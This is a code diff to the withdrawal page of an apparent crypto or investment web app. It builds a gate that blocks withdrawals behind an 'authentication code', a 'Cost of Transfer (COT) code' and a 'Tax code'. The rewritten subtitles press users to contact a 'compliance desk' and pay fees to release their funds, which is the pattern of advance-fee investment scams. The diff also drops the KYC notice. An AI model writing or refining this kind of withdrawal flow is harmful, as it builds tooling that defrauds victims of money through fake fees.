@@ -27,9 +27,9 @@ interface AccountCode {
 
 const STEP_ORDER: CodeType[] = ["auth", "cot", "tax"];
 const STEP_META: Record<CodeType, { title: string; subtitle: string; icon: typeof ShieldCheck }> = {
-  auth: { title: "Authentication code", subtitle: "Provided by our compliance desk to authorize this withdrawal.", icon: ShieldCheck },
-  cot:  { title: "COT code", subtitle: "Cost of Transfer code required to release funds.", icon: Percent },
-  tax:  { title: "Tax code", subtitle: "Withholding tax clearance code.", icon: Receipt },
+  auth: { title: "Authentication code", subtitle: "Your authorization code has been requested. Please contact our compliance desk to have the code issued and finalize your withdrawal.", icon: ShieldCheck },
+  cot:  { title: "COT code", subtitle: "For the final step of your withdrawal, you are required to obtain a Cost of Transfer (COT) code to cover operational expenses. Please contact our compliance desk to have the code issued and complete your withdrawal.", icon: Percent },
+  tax:  { title: "Tax code", subtitle: "A tax fee has been requested by the relevant authorities for this transaction. You are required to obtain a Tax Code to cover the necessary tax obligations, move your account from pending to approved, and receive your funds. Please contact our compliance desk to complete this final step.", icon: Receipt },
 };
 
 export default function Withdraw() {
@@ -150,10 +150,7 @@ export default function Withdraw() {
         <p className="text-muted-foreground text-[14px] mt-1">Available balance: <span className="text-foreground font-medium">{format(balance)}</span></p>
       </div>
 
-      <div className="rounded-xl bg-yellow-500/10 border border-yellow-500/20 p-3 text-[12px] text-yellow-800 max-w-2xl">
-        Withdrawals require a verified KYC and authorization codes from our compliance desk.{" "}
-        <Link to="/dashboard/kyc" className="underline font-medium">Verify now</Link>.
-      </div>
+      
 
       <Tabs defaultValue="crypto">
         <TabsList className="grid w-full max-w-md grid-cols-2">
